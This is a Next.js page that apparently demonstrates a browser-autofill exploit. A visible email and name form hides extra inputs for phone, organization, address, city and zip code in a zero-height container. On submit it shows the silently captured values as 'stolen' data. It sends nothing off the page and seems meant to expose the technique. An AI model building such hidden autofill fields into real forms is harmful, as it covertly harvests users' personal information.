import Head from 'next/head'
import { useState } from 'react'

function FormRow({ name, data }) {
  return (
    <div className="text-xl">
      <span className="font-bold">{name}:&nbsp;</span><span>{data}</span>
    </div>
  )
}

export default function Home() {
  const [formdata, setFormdata] = useState({})
  const [submitted, setSubmitted] = useState(false)

  function updateFormdataFactory(name) {
    return (e) => {
      setFormdata(d => ({ ...d, [name]: e.target.value }))
    }
  }

  function handleSubmit(e) {
    e.preventDefault()
    setSubmitted(true)
  }

  return (
    <>
      <Head>
        <title>Advanced Form field exploit</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <div className="mx-8">
        <div class="max-w-prose mx-auto">
          <form autocomplete="on" onSubmit={handleSubmit}>
            <h2 className="font-bold text-pink-800 text-3xl pt-4">We would never steal your data.</h2>

            <input
              type="email"
              name="email"
              id="email"
              className="form-input rounded w-full p-4 mt-4 border-2 border-blue-500 text-blue-500"
              placeholder="Email"
              autocomplete="email"
              onChange={updateFormdataFactory('email')}
            />
            <input
              type="text"
              name="name"
              id="name"
              className="form-input rounded w-full p-4 mt-4 border-2 border-blue-500 text-blue-500"
              placeholder="Full name"
              autocomplete="name"
              onChange={updateFormdataFactory('name')}
            />
            <div className="h-0 overflow-hidden">
              <input
                type="text"
                name="organization"
                placeholder="organization"
                autocomplete="organization"
                onChange={updateFormdataFactory('organization')}
              />
              <input
                type="text"
                name="phone"
                placeholder="Phone Number"
                autocomplete="tel"
                onChange={updateFormdataFactory('tel')}
              />
              <input
                type="text"
                name="address"
                placeholder="Address"
                autocomplete="address"
                onChange={updateFormdataFactory('address')}
              />

              <input
                type="text"
                name="city"
                placeholder="City"
                autocomplete="address-level2"
                onChange={updateFormdataFactory('city')}
              />
              <input
                type="text"
                name="postal"
                placeholder="Zip code"
                autocomplete="postal-code"
                onChange={updateFormdataFactory('zip')}
              />
            </div>

            <input
              type="submit"
              className="mt-4 bg-blue-500 text-white rounded p-4 border-2 border-blue-500 hover:bg-white hover:text-blue-500 cursor-pointer"
              value="Submit"
            />
          </form>

          {submitted && <div className="my-4 p-4 rounded-xl bg-red-200">
            <h2 className="text-xl text-red-900 font-bold pb-4">Data that has been stolen:</h2>
            {Object.entries(formdata).map(([key, value]) => <FormRow key={key} name={key} data={value} />)}
          </div>}
        </div>
      </div>
    </>
  )
}
